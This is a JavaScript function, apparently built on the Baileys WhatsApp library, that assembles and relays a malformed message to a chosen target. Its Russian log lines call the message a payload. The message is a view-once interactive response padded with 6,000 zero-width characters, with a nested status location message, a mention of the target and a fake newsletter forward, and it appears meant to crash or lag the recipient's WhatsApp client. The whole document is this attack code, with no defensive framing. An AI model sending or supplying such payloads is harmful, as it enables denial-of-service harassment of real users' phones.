async function locaDelay(sock, target) {
  try {
    console.log("подготовка полезной нагрузки...");

    const Reomsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {},

          interactiveResponseMessage: {
            body: {
              text: "Соло без аккомпанемента [ 🦋 ]",
              format: "DEFAULT"
            },

            nativeFlowResponseMessage: {
              name: "Anita",
              paramsJson: JSON.stringify({
                info: "IRENG" + "\u200B".repeat(6000)
              }),
              version: 3
            },

            groupStatusMessageV2: {
              message: {
                locationMessage: {
                  degreesLatitude: 12.3456,
                  degreesLongitude: 65.4321,
                  name: "UK",
                  address: "-Fuck",
                  isLive: false
                }
              }
            },

            contextInfo: {
              participant: target,
              isForwarded: false,
              forwardingScore: 0,
              mentionedJid: [target],

              forwardedNewsletterMessageInfo: {
                newsletterName: "[ 🦋 ] – Reoclint Official",
                newsletterJid: "1@newsletter",
                serverMessageId: 1
              }
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, Reomsg, {});

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    console.log("УСПЕШНАЯ ОТПРАВКА УЗЛА");

  } catch (err) {
    console.error("ОШИБКА:", err);
  }
}